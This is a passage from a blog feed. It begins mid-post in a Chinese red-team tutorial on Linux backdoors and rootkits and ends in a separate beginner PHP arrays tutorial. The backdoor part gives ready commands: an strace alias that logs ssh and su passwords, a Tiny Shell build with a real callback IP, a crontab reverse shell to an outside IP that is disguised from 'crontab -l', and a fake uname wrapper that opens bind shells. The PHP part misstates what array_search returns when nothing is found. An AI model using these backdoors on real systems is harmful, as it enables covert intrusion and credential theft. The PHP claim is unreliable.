/tmp/sshpwd-`date    &#39;+%d%h%m%s&#39;`.log  \ -e read,write,connect  -s2048 ssh&#39;</code></pre><p>这个也类似于alias后门</p><p>docker测试的时候加 –privileged参数</p><p>同理可以记录其他命令</p><pre><code>su=&#39;strace   -o   /tmp/sulog-`date    &#39;+%d%h%m%s&#39;`.log  \ -e read,write,connect  -s2048 su&#39;</code></pre><h2 id="Tiny-shell"><a href="#Tiny-shell" class="headerlink" title="Tiny shell"></a>Tiny shell</h2><p>项目地址:<a href="https://github.com/orangetw/tsh" target="_blank" rel="noopener">https://github.com/orangetw/tsh</a></p><p>在linux下编译</p><pre><code>./compile.sh linux 149.129.72.186 1234 wing 22</code></pre><p>参数代表的意思如下</p><pre><code>usage:compile.sh os BC_HOST BC_PORT [PASSWORD] [BC_DELAY]compile.sh os 8.8.8.8 8081compile.sh os 8.8.8.8 8081 mypassword 60Please specify one of these targets:    compile.sh linux    compile.sh freebsd    compile.sh openbsd    compile.sh netbsd    compile.sh cygwin    compile.sh sunos    compile.sh irix    compile.sh hpux    compile.sh osf</code></pre><p>成功以后会生成tsh和tshd文件<br>分别表示控制端和服务端<br>在目标上运行</p><pre><code>umask 077; HOME=/var/tmp ./tshd</code></pre><p>在攻击机器上运行</p><pre><code>tsh targetip</code></pre><p>可以得到一个shell.<br>除此之外,还可以上传和下载文件.</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODUzOTczMzIzNzQuanBn?x-oss-process=image/format,png" alt="-w672"></p><p><strong>-w672</strong></p><p>反弹的形式</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODUzOTcxNTI5NDguanBn?x-oss-process=image/format,png" alt="-w585"></p><p><strong>-w585</strong></p><h2 id="浏览器插件后门"><a href="#浏览器插件后门" class="headerlink" title="浏览器插件后门"></a>浏览器插件后门</h2><p>项目地址:<a href="https://github.com/graniet/chromebackdoor" target="_blank" rel="noopener">https://github.com/graniet/chromebackdoor</a></p><p>我花了很多时间来测试这个项目,目前还没成功,不知道是不是浏览器有限制.</p><h2 id="Local-Job-Scheduling"><a href="#Local-Job-Scheduling" class="headerlink" title="Local Job Scheduling"></a>Local Job Scheduling</h2><h3 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h3><p>测试环境:mac<br>定时反弹shell</p><pre><code>(crontab -l;printf &quot;*/1 * * * * /usr/bin/nc 30.157.170.75 1389 /bin/sh;\rno crontab for `whoami`%100c\n&quot;)|crontab -</code></pre><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODY5OTU5Mzk1MTkuanBn?x-oss-process=image/format,png" alt="-w1554"></p><p><strong>-w1554</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODY5OTU4MjE5NzguanBn?x-oss-process=image/format,png" alt="-w780"></p><p><strong>-w780</strong></p><h2 id="other-backdoor"><a href="#other-backdoor" class="headerlink" title="other backdoor"></a>other backdoor</h2><p>项目地址:<a href="https://github.com/iamckn/backdoors" target="_blank" rel="noopener">https://github.com/iamckn/backdoors</a><br>一些进程隐藏技术,然后反弹shell.</p><p>用uname做一个演示</p><p>uname.sh</p><pre><code>#uname#-------------------------touch /usr/local/bin/unamecat &lt;&lt;EOF &gt;&gt; /usr/local/bin/uname#!/bin/bash#nc.traditional -l -v -p 4444 -e /bin/bash 2&gt;/dev/null &amp;#socat TCP4-Listen:3177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;socat SCTP-Listen:1177,fork EXEC:/bin/bash 2&gt;/dev/null &amp;#perl -MIO -e&#39;$s=new IO::Socket::INET(LocalPort=&gt;1337,Listen=&gt;1);while($c=$s-&gt;accept()){$_=&lt;$c&gt;;print $c `$_`;}&#39; 2&gt;/dev/null &amp;/bin/uname \$@EOF</code></pre><p>里面的反弹shell命令自己替换</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODc5MTU4OTg1MTEuanBn?x-oss-process=image/format,png" alt="-w1102"></p><p><strong>-w1102</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODc5MTU5ODE4NjEuanBn?x-oss-process=image/format,png" alt="-w1102"></p><p><strong>-w1102</strong></p><h2 id="0x03-Rookit"><a href="#0x03-Rookit" class="headerlink" title="0x03 Rookit"></a>0x03 Rookit</h2><h3 id="Rookit是什么"><a href="#Rookit是什么" class="headerlink" title="Rookit是什么"></a>Rookit是什么</h3><p>在悬念迭起的中外谍战片里，对战双方中的一派势力通常会派遣特工人员潜伏到对手阵营中。这名卧底人员良好的伪装使得对手对此长时间毫无察觉；为了能够长期潜伏他不贸然采取高风险行为以免过早暴露自己；他赢得敌人的信任并因此身居要职，这使得他能够源源不断地获取重要情报并利用其独特渠道传送回去。</p><p>从某种意义上说这位不速之客就是Rootkit——持久并毫无察觉地驻留在目标计算机中，对系统进行操纵、并通过隐秘渠道收集数据的程序。Rootkit的三要素就是：隐藏、操纵、收集数据。</p><p>“Rootkit”中root术语来自于unix领域。由于unix主机系统管理员账号为root账号，该账号拥有最小的安全限制，完全控制主机并拥有了管理员权限被称为“root”了这台电脑。然而能够“root”一台主机并不意味着能持续地控制它，因为管理员完全可能发现了主机遭受入侵并采取清理措施。因此Rootkit的初始含义就在于“能维持root权限的一套工具”。</p><p>简单地说，Rootkit是一种特殊的恶意软件，它的功能是在安装目标上隐藏自身及指定的文件、进程和网络链接等信息，比较多见到的是Rootkit一般都和木马、后门等其他恶意程序结合使用。Rootkit通过加载特殊的驱动，修改系统内核，进而达到隐藏信息的目的。</p><p>一个典型rootkit包括：</p><ul><li><p>1 以太网嗅探器程序，用于获得网络上传输的用户名和密码等信息。</p></li><li><p>2 特洛伊木马程序，例如：inetd或者login，为攻击者提供后门。</p></li><li><p>3 隐藏攻击者的目录和进程的程序，例如：ps、netstat、rshd和ls等。</p></li><li><p>4 可能还包括一些日志清理工具，例如：zap、zap2或者z2，攻击者使用这些清理工具删除wtmp、utmp和lastlog等日志文件中有关自己行踪的条目。</p></li><li><p>一些复杂的rootkit还可以向攻击者提供telnet、shell和finger等服务。</p></li></ul><h3 id="应用级rootkit"><a href="#应用级rootkit" class="headerlink" title="应用级rootkit"></a>应用级rootkit</h3><p>应用级rookit的主要特点是通过批量替换系统命令来实现隐藏，如替换ls、ps和netstat等命令来隐藏文件、进程和网络连接等，有时会有守护进程来保证后门的稳定性。推荐两款常用的木马：mafix和brookit。<br>应用级的比较容易清掉,最麻烦的是内核级和硬件级的.</p><p>###内核级rookit<br>通过加载内核模块的方式来加载后门，比较复杂。一般内核后门都是针对操作系统而言的，不同的操作系统内核模块设置编写方法都不一样，一般不通用。内核后门一般无法通过md5校验等来判断，所有基本比较难发现，目前针对内核后门比较多的是Linux和Solaris下。</p><h3 id="硬件级后门"><a href="#硬件级后门" class="headerlink" title="硬件级后门"></a>硬件级后门</h3><p>这个就是厂商的板子里面就有后门,比如cpu处理器,主板,鼠标,等等.</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMDk5MjU1NzAuanBn?x-oss-process=image/format,png" alt="-w953"></p><p><strong>-w953</strong></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMTAxMTAyNTIuanBn?x-oss-process=image/format,png" alt="-w953"></p><p><strong>-w953</strong></p><p>demo:我找的这个是应该是内核rookit的例子,其他经典内核的可以看下这两个:</p><p><a href="https://github.com/David-Reguera-Garcia-Dreg/enyelkm" target="_blank" rel="noopener">https://github.com/David-Reguera-Garcia-Dreg/enyelkm</a><br><a href="https://github.com/yaoyumeng/adore-ng" target="_blank" rel="noopener">https://github.com/yaoyumeng/adore-ng</a></p><h3 id="Reptile"><a href="#Reptile" class="headerlink" title="Reptile"></a>Reptile</h3><p>测试环境:kali</p><p>项目地址:<a href="https://github.com/f0rb1dd3n/Reptile" target="_blank" rel="noopener">https://github.com/f0rb1dd3n/Reptile</a></p><p>安装:</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxMTgyNjUxNTIuanBn?x-oss-process=image/format,png" alt="-w961"></p><p><strong>-w961</strong></p><p>emmmm<br>环境炸了.kali得重装<br>使用教程参考如下<br><a href="https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc" target="_blank" rel="noopener">https://www.notion.so/redteamwing/Reptile-LKM-Linux-rootkit-153c8daa25244ce69461d1515375e8cc</a></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9yZWR0ZWFtd2luZy5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tLzIwMjAvMDMvMDQvMTU2ODgxNzA5MjQ5NzguanBn?x-oss-process=image/format,png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php中的数组</title>
      <link href="/2020/041151042.html"/>
      <url>/2020/041151042.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-数组的定义与类型"><a href="#0x01-数组的定义与类型" class="headerlink" title="0x01.数组的定义与类型"></a>0x01.数组的定义与类型</h2><p><strong>如何定义数组？</strong><br>一般都是使用 array() 函数定义的数组</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'jsp'</span><span class="token punctuation">,</span><span class="token string">'asp'</span><span class="token punctuation">,</span><span class="token string">'php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411181549382.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="输出结果"><br><strong>数组的两种类型</strong><br>数组类型分<br><code>1.索引数组</code><br><code>2.关联数组</code></p><p><strong>索引数组</strong>，其实就是全名叫 数字索引数组，顾名思义<br>就是以数字索引的数组，也就是上面那串代码定义的，就索引数组<br>（在PHP中，数组的值第一位是 0）</p><p>关联数组，也很简单，数组其实就是由键值组成的，与python中的字典相似，关联数组其实就是我们自定义的键</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'young'</span><span class="token punctuation">,</span><span class="token string">'old'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'17'</span><span class="token punctuation">,</span><span class="token string">'from'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'中国'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411182309594.png" alt="输出结果"><br>这样看的话可能不是很清楚，我们可以直接查看源代码，看起来不会懵逼<br><img src="https://img-blog.csdnimg.cn/20200411182354735.png" alt><br>这样其实就是关联数组，而直接使用array定义的就是的 索引数组，第一位是0，觉得很麻烦。也可以这样定义，把第一位定义成 1</p><h2 id="0x02-一维数组、二维数组-与-多维数组"><a href="#0x02-一维数组、二维数组-与-多维数组" class="headerlink" title="0x02. 一维数组、二维数组 与 多维数组"></a>0x02. 一维数组、二维数组 与 多维数组</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'young'</span><span class="token punctuation">,</span><span class="token string">'17'</span><span class="token punctuation">,</span><span class="token string">'中国'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//一维数组</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token comment" spellcheck="true">//输出数组</span><span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//定义二维数组</span><span class="token variable">$arr2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'name'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">'李四'</span><span class="token punctuation">,</span><span class="token string">'王五'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'old'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'20'</span><span class="token punctuation">,</span><span class="token string">'21'</span><span class="token punctuation">,</span><span class="token string">'23'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输出数组</span><span class="token delimiter">?></span></code></pre><p>上面定义的其实就是一维数组，其实听着很高大尚，其实就是跟嵌套差不多<br>在一个数组中嵌套这另外一个数组<br><img src="https://img-blog.csdnimg.cn/20200411183330801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="输出结果对比"><br>这样就更容易的对比了，我们也可以查看源代码，这样看起来舒服<br><img src="https://img-blog.csdnimg.cn/20200411183525791.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="查看源代码"></p><p>然后我们继续在数组中嵌套一层就是 三维数组，几层嵌套，就是几层数组，但是建议不要太多</p><h2 id="0x03-数组遍历"><a href="#0x03-数组遍历" class="headerlink" title="0x03.数组遍历"></a>0x03.数组遍历</h2><h4 id="1）for循环遍历数组"><a href="#1）for循环遍历数组" class="headerlink" title="1）for循环遍历数组"></a>1）for循环遍历数组</h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'张三'</span><span class="token punctuation">,</span><span class="token string">"a公司"</span><span class="token punctuation">,</span><span class="token string">"北京市"</span><span class="token punctuation">,</span><span class="token string">"(010)987654321"</span><span class="token punctuation">,</span><span class="token string">"gao@qq.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"   "</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411184921850.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="源代码"><br>我们依旧右键点击查看源代码<br>其实for循环主要是通过  <code>$arr[$i]</code><br>首先定义一个一维数组，然后使用for循环，初始值为0，count()就是判断数组的长度，有几个值，这里的话是从1开始算的，每遍历一次就 加1.</p><p>它先是 执行 <code>$i=0</code>,<br>然后代入 <code>$arr[0]</code> 就输出了1，然后 i 加 1。判断是否小于数组的值，然后再次循环…<br>直到 i 为6时，才停止循环。因为 6 不可能小于 6。<br><strong>对于多维数组的遍历，只需要多加一个for循环即可</strong></p><h4 id="2）foreach-遍历数组"><a href="#2）foreach-遍历数组" class="headerlink" title="2）foreach() 遍历数组"></a>2）foreach() 遍历数组</h4><p><code>foreach()</code>遍历有2种形式<br><strong>第一种:</strong></p><pre class=" language-php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    循环体<span class="token punctuation">}</span></code></pre><p><strong>第二种：</strong></p><pre class=" language-php"><code class="language-php"><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    循环体<span class="token punctuation">}</span></code></pre><p><strong>①.第一种解释</strong>：<br>其实第一种遍历的是数组里面的值</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"baidu"</span><span class="token punctuation">,</span><span class="token string">"taobao"</span><span class="token punctuation">,</span><span class="token string">"google"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'$value为：'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>我其实不用 print_r 的，但是为了清楚<br>首先<code>foreach（$arr as $value）</code><br><code>$arr</code> 其实就是一维数组里面的内容，而变量<code>$value</code> 其实就是数组中的值，也就是说，<code>$arr as $value</code> 其实就是遍历数组中的内容，把 <code>$arr</code> 中的内容，赋值给 value</p><p>至于 <code>$value</code> 可以自定义命名的</p><p><strong>②第二种解释：</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$key</span><span class="token punctuation">.</span><span class="token string">'=>'</span><span class="token punctuation">.</span><span class="token variable">$value</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>其实就是把键也给遍历了，并且赋值给了 key</p><h4 id="0x04-字符串与数组转换"><a href="#0x04-字符串与数组转换" class="headerlink" title="0x04.字符串与数组转换"></a>0x04.字符串与数组转换</h4><p><strong>1. 将字符串变为数组   explode()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token string">'baidu,taobao,google'</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>其实这里就是分割，这边是逗号，然后我们就以逗号分割，分割的时候<br>它会返回数组（这里也就是分割）</p><p><strong>2. 将数组变为字符串   implode()</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>implode(‘符号’,str)<br>看上面这个就知道了，符号就是说，要用什么分割</p><h4 id="0x05-数组的一些操作"><a href="#0x05-数组的一些操作" class="headerlink" title="0x05.数组的一些操作"></a>0x05.数组的一些操作</h4><h5 id="1）统计数组个数-count"><a href="#1）统计数组个数-count" class="headerlink" title="1）统计数组个数 count()"></a>1）统计数组个数 count()</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>然后这里的话就是，使用count函数，如果要统计多维数组呢？</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'www.taobao.com'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token operator">=</span><span class="token operator">></span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'www.google.com'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里只需要在count() 函数添加一个 1 参数就可以了<br><img src="https://img-blog.csdnimg.cn/20200411210608590.png" alt></p><h5 id="2）数组中的-“增”-array-push"><a href="#2）数组中的-“增”-array-push" class="headerlink" title="2）数组中的 “增”  array_push()"></a>2）数组中的 “增”  <code>array_push()</code></h5><p>使用 <code>array_push(add,add_var)</code></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token string">'boke'</span><span class="token punctuation">,</span><span class="token string">'baidu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411211026662.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" alt="成功的把boke和baidu添加进去了"></p><h5 id="3-数组中的-“删”-array-unique"><a href="#3-数组中的-“删”-array-unique" class="headerlink" title="3) 数组中的 “删”  array_unique()"></a>3) 数组中的 “删”  <code>array_unique()</code></h5><p>这时候我们看上面似乎多添加了一个百度</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token string">'boke'</span><span class="token punctuation">,</span><span class="token string">'baidu'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//上面是添加，下面删除重复值</span><span class="token variable">$del</span> <span class="token operator">=</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$del</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411211759472.png" alt></p><h5 id="4-数组中的-“查”-array-search"><a href="#4-数组中的-“查”-array-search" class="headerlink" title="4)  数组中的 “查”  array_search()"></a>4)  数组中的 “查”  <code>array_search()</code></h5><p><strong>①<code>array_search(var,array,strict)</code>:  查找 值 返回键</strong><br>var ：是我们需要查找的值<br>array：是指定被我们查询的数组<br>strict：是可选参数，当参数为 true时，还会给数组中检查给定值得类型</p><p>这个函数是查找指定的值，然后返回键，如果没有查找到的话返回 null，不是flase</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'baidu'</span><span class="token punctuation">,</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token string">'google'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string">'taobao'</span><span class="token punctuation">,</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200411212819812.png" alt="查找到值返回键名"><br><img src="https://img-blog.csdnimg.cn/20200411212849751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ2MzA0ODQw,size_16,color_FFFFFF,t_70" 